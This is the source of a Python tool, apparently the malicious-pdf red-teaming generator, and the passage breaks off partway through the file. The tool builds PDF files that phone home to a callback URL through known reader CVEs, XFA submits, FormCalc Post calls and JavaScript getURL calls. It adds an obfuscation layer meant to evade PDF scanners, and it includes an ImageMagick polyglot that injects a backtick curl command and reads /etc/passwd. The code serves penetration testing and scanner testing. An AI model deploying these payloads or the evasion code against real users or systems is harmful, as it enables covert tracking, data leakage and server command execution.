#!/usr/bin/python
# -*- coding: UTF-8 -*-
##
## Generate 47 malicious PDF files with phone-home functionality
## Used for penetration testing and/or red-teaming etc
##
## Usage: python3 malicious-pdf.py <callback-url>
##
## Output will be written to the output/ directory as test1.pdf, test2.pdf, etc.
##
## Based on https://github.com/modzero/mod0BurpUploadScanner/ and https://github.com/deepzec/Bad-Pdf
##
## Jonas Lejon, 2023-2026 <jonas.github@triop.se>
## https://github.com/jonaslejon/malicious-pdf

import sys
import bz2
import base64
import ipaddress
import validators
import os
import re
import zlib
import random
import argparse
from pathlib import Path

KNOWN_SCHEMES = ('http://', 'https://', 'ftp://', 'ftps://', 'file://', 'smb://',
                  'ssh://', 'telnet://', 'gopher://', 'ldap://', 'mailto:', 'news:',
                  'nntp://', 'irc://', 'data:', 'javascript:')


def validate_url_or_ip_validators(input_string):
    """Validates if input is an IP address or a URL with a scheme."""

    # 1. Check for IP address first
    try:
        ipaddress.ip_address(input_string)
        return True
    except ValueError:
        pass # Not a valid IP, continue to URL/domain checks

    # 2. Check for URL with any scheme (http, https, ftp, etc.)
    # validators.url() by default only accepts http/https, so we need to check for other schemes
    if validators.url(input_string):
        return True

    # 3. Check if it has a scheme prefix for other protocols
    for scheme in KNOWN_SCHEMES:
        if input_string.lower().startswith(scheme):
            # Basic validation: ensure there's something after the scheme
            if len(input_string) > len(scheme):
                return True

    return False


def ensure_scheme(host):
    """Add https:// if the host has no recognized scheme (e.g. bare IP address)."""
    if not host.lower().startswith(KNOWN_SCHEMES):
        return f'https://{host}'
    return host


# ---------------------------------------------------------------------------
# Obfuscation engine
# ---------------------------------------------------------------------------

def _name_to_hex(name_bytes):
    """Encode a PDF name token using #XX hex escapes. E.g. b'/JavaScript' -> b'/#4a#61#76#61#53#63#72#69#70#74'."""
    if not name_bytes.startswith(b'/'):
        return name_bytes
    encoded = b'/'
    for byte in name_bytes[1:]:
        if random.random() < 0.7:  # encode ~70% of chars for variation
            encoded += b'#' + format(byte, '02x').encode()
        else:
            encoded += bytes([byte])
    return encoded


def _string_to_octal(match):
    """Convert a PDF literal string (xxx) to octal escapes."""
    content = match.group(1)
    result = b'('
    for byte in content:
        if byte in (0x28, 0x29, 0x5c):  # ( ) \ must stay escaped
            result += b'\\' + bytes([byte])
        elif random.random() < 0.6:
            result += b'\\' + format(byte, '03o').encode()
        else:
            result += bytes([byte])
    result += b')'
    return result


def _string_to_hex(match):
    """Convert a PDF literal string (xxx) to hex string <XX XX>."""
    content = match.group(1)
    hex_bytes = b'<'
    for byte in content:
        hex_bytes += format(byte, '02x').encode()
        if random.random() < 0.3:
            hex_bytes += b' '  # random whitespace
    hex_bytes += b'>'
    return hex_bytes


def _obfuscate_js_payload(js_bytes):
    """Obfuscate JavaScript code using eval + String.fromCharCode."""
    # Extract the JS string content from between ( and )
    # We wrap the entire payload in eval(String.fromCharCode(...))
    codes = ','.join(str(b) for b in js_bytes)
    return f'eval(String.fromCharCode({codes}))'.encode()


def _obfuscate_js_bracket_notation(js_bytes):
    """Replace common JS API dot notation with bracket notation."""
    js = js_bytes.decode('latin-1')
    replacements = [
        ('this.submitForm', 'this["submitForm"]'),
        ('this.getURL', 'this["getURL"]'),
        ('app.launchURL', 'app["launchURL"]'),
        ('app.openDoc', 'app["openDoc"]'),
        ('app.media.getURLData', 'app["media"]["getURLData"]'),
        ('SOAP.connect', 'SOAP["connect"]'),
        ('SOAP.request', 'SOAP["request"]'),
        ('this.importDataObject', 'this["importDataObject"]'),
    ]
    for old, new in replacements:
        js = js.replace(old, new)
    return js.encode('latin-1')


def _obfuscate_js_uri(uri_bytes):
    """Obfuscate a javascript: URI with case variation and whitespace."""
    uri = uri_bytes.decode('latin-1')
    if uri.lower().startswith('javascript:'):
        prefix = uri[:11]  # "javascript:"
        payload = uri[11:]
        # Random case variation
        obf_prefix = ''.join(
            c.upper() if random.random() < 0.5 else c.lower()
            for c in prefix[:-1]  # everything except ':'
        ) + ':'
        # Optionally insert tab/newline in protocol
        if random.random() < 0.5:
            pos = random.randint(1, len(obf_prefix) - 2)
            char = random.choice(['\t', '\n'])
            obf_prefix = obf_prefix[:pos] + char + obf_prefix[pos:]
        return (obf_prefix + payload).encode('latin-1')
    return uri_bytes


def _flate_encode_stream(data, stream_start, stream_end):
    """Replace a stream's raw content with FlateDecode compressed version."""
    raw_content = data[stream_start:stream_end]
    compressed = zlib.compress(raw_content)
    return compressed


def obfuscate_pdf(filepath, level):
    """Apply obfuscation to a generated PDF file.

    Level 1: PDF name hex encoding + string octal/hex encoding
    Level 2: Level 1 + JS obfuscation + XSS URI variations
    Level 3: Level 2 + FlateDecode stream compression
    """
    try:
        data = filepath.read_bytes()
    except Exception:
        return

    if not data.startswith(b'%PDF'):
        return

    # --- Level 2: JavaScript + XSS obfuscation (applied BEFORE string encoding) ---
    if level >= 2:
        # Obfuscate JavaScript payloads using bracket notation
        # Must run before level 1 string encoding mangles the JS content
        def _obf_js_content(m):
            prefix = m.group(1)
            js_content = m.group(2)
            obfuscated = _obfuscate_js_bracket_notation(js_content)
            return prefix + b'(' + obfuscated + b')'

        # Match /JS followed by a parenthesized string (greedy, handles nested parens)
        data = re.sub(
            rb'(/JS\s*)\(((?:[^()]*\([^()]*\))*[^()]*)\)',
            _obf_js_content,
            data,
            count=0
        )

        # Obfuscate javascript: URIs with case variation
        data = re.sub(
            rb'javascript:[^\)"]+',
            lambda m: _obfuscate_js_uri(m.group(0)),
            data
        )

    # --- Level 1: Name and string obfuscation ---
    if level >= 1:
        # Obfuscate PDF name tokens that are detection keywords
        keywords = [
            b'/JavaScript', b'/OpenAction', b'/Launch', b'/SubmitForm',
            b'/GoToR', b'/GoToE', b'/ImportData', b'/Thread',
            b'/RichMedia', b'/EmbeddedFile', b'/XFA',
        ]
        for kw in keywords:
            if kw in data:
                data = data.replace(kw, _name_to_hex(kw), 1)

        # Obfuscate /JS and /AA names (short, common detection targets)
        data = re.sub(rb'/JS\s*\(', lambda m: _name_to_hex(b'/JS') + b' (', data)
        data = re.sub(rb'/AA\s*<', lambda m: _name_to_hex(b'/AA') + b' <', data)

        # Obfuscate URL strings in /URI actions only (not FileSpec /F which needs literal URLs)
        # FileSpec URLs must stay literal for the viewer to make network requests
        def _maybe_hex_string(m):
            if random.random() < 0.5:
                return _string_to_hex(m)
            return _string_to_octal(m)

        # Only match URLs in /URI context (not preceded by /F or /FileSpec)
        data = re.sub(
            rb'(/URI\s*)\((https?://[^()]*)\)',
            lambda m: m.group(1) + _maybe_hex_string(re.match(rb'\((.*)\)', b'(' + m.group(2) + b')')),
            data
        )

    # --- Level 3: Stream compression ---
    if level >= 3:
        # Find uncompressed streams and compress them with FlateDecode
        # Pattern: << ... >> stream\n ... \nendstream
        # Only compress streams that don't already have a /Filter
        def _compress_stream(m):
            dict_content = m.group(1)
            stream_data = m.group(2)
            if b'/Filter' in dict_content:
                return m.group(0)  # already filtered, skip
            if len(stream_data) < 50:
                return m.group(0)  # too small, not worth it
            try:
                compressed = zlib.compress(stream_data)
                new_dict = re.sub(rb'/Length\s+\d+', b'/Length ' + str(len(compressed)).encode(), dict_content)
                if b'/Length' not in new_dict:
                    new_dict = new_dict.rstrip(b' >') + b' /Length ' + str(len(compressed)).encode()
                new_dict += b' /Filter /FlateDecode'
                return b'<< ' + new_dict + b' >>\nstream\n' + compressed + b'\nendstream'
            except Exception:
                return m.group(0)

        data = re.sub(
            rb'<<\s*(.*?)\s*>>\s*stream\n(.*?)\nendstream',
            _compress_stream,
            data,
            flags=re.DOTALL
        )

    filepath.write_bytes(data)


# This is CVE-2018-4993
# From https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
def create_malpdf(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R

   /AA <<
	   /O <<
	      /F (''' + host + ''')
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>

	   >>

	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj


4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj


trailer
<<
	/Root 1 0 R
>>

%%EOF
''')


def create_malpdf2(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="Hello World!">
            <event activity="docReady" ref="$host" name="event__click">
               <submit
                     textEncoding="UTF-16"
                     xdpContent="pdf datasets xfdf"
                     target="''' + host + '''"/>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')

#a pdf file where javascript code is evaluated for execution
# % BSD Licence, Ange Albertini, 2011
def create_malpdf3(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      eval(
          'app.openDoc({cPath: encodeURI("''' + host +'''"), cFS: "CHTTP" });'
          );
      )
      >>
  >>
>>''')

# Adobe Reader - PDF callback via XSLT stylesheet in XFA
# CVE-2019-7089
# From: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html
def create_malpdf4(filename, host):
    with open(filename, "w") as file:
        file.write(r'''%PDF-

1 0 obj <<>>
stream
<?xml version="1.0" ?>
<?xml-stylesheet href="\\\\''' + host + r'''\whatever.xslt" type="text/xsl" ?>
endstream
endobj
trailer <<
    /Root <<

        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>
''')

## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf5(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'uri'     ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /URI
     /URI (''' + host + '''/test5)
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
854
%%EOF
''')

## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch2.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf6(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'launch'  ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /Launch
     /F << /Type /FileSpec /F (''' + host + '''/test6.pdf) /V true /FS /URL >>
     /NewWindow false
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
922
%%EOF
''')

## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch3.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf7(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'gotor'   ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /GoToR
     /F << /Type /FileSpec /F ('''+host+'''/test7.pdf) /V true /FS /URL >>
     /NewWindow false
     /D [0 /Fit]
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
937
%%EOF
''')

## Testcase from ./02-exploits/15-masterpdf-editor/02-disclosure-01-url-invocation.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf8(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'form'    ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /SubmitForm
     /F << /Type /FileSpec /F ('''+host+'''/test8.pdf) /V true /FS /URL >>
     /Flags 4 % SubmitHTML
   % /Flags 32 % SubmitXFDF
   % /Flags 256 % SubmitPDF
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000187 00000 n
0000000288 00000 n
0000000553 00000 n
0000000673 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
908
%%EOF
''')

## Testcase from 01-testsuite/02-disclosure/01-url-invocation/data-link.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf9(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'data'    ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /ImportData
     /F << /Type /FileSpec /F ('''+host+'''/test9.pdf) /V true /FS /URL >>
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000164 00000 n
0000000265 00000 n
0000000724 00000 n
0000000844 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
997
%%EOF
''')

# Foxit PDF Reader PoC, macOS version "patch gap" : CVE-2017-10951
# Source: https://twitter.com/l33d0hyun/status/1448342241647366152
# Uses this.getURL() to trigger a callback via Foxit Reader's JavaScript engine
def create_malpdf10(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>>
2 0 obj
<</S /JavaScript /JS (
this.getURL("''' + host + '''/test10")
)>> trailer <</Root 1 0 R>>''')

# Eicar test file embedded in PDF. Source: https://github.com/fire1ce/eicar-standard-antivirus-test-files
# Created by Stas Yakobov
def create_malpdf11(filename):
    eicar = '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'
    with open(filename, "wb") as file:
        file.write(bz2.decompress(base64.b64decode(eicar)))

# FormCalc GET/POST data exfiltration via XFA
# CVE-2014-8453 - FormCalc same-origin policy bypass
# FormCalc's Post() and GET() functions execute in the browser context with session cookies
# Source: https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html
def create_malpdf12(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="FormCalc Exfil">
            <event activity="initialize">
                <script contentType='application/x-formcalc'>
                    Post("''' + host + '''/test12","formcalc-callback","text/plain","utf-8","")
                </script>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')

# Client-side request injection via CRLF in XFA textEncoding attribute
# Injects newlines into POST requests, allowing HTTP header manipulation
# Source: https://insert-script.blogspot.com/2018/05/adobe-reader-pdf-client-side-request.html
def create_malpdf13(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="CRLF Inject">
            <event activity="docReady" ref="$host" name="event__click">
               <submit
                     textEncoding="UTF-16&#xD;&#xA;X-Injected: true&#xD;&#xA;"
                     xdpContent="pdf datasets xfdf"
                     target="''' + host + '''/test13"/>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')

# ImageMagick shell injection via SVG-MSL polyglot
# Exploits unsafe password handling in ImageMagick's PDF coder (Ghostscript delegate)
# The SVG self-references as MSL, triggering the authenticate attribute injection
# Targets server-side ImageMagick processing of uploaded files
# Source: https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html
def create_malpdf14(filename, host):
    basename = os.path.basename(str(filename))
    with open(filename, "w") as file:
        file.write('''<image authenticate='ff" `curl ''' + host + '''/test14`;"'>
  <read filename="pdf:/etc/passwd"/>
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="msl:''' + basename + '''" height="100" width="100"/>
  </svg>
</image>
''')

# FormCalc POST with arbitrary HTTP header injection via XFA
# The 5th parameter of FormCalc's Post() function allows setting arbitrary HTTP headers
# Can override Host, Content-Type, Referer and other normally restricted headers
# Source: https://insert-script.blogspot.com/2015/05/pdf-mess-with-web.html
def create_malpdf15(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
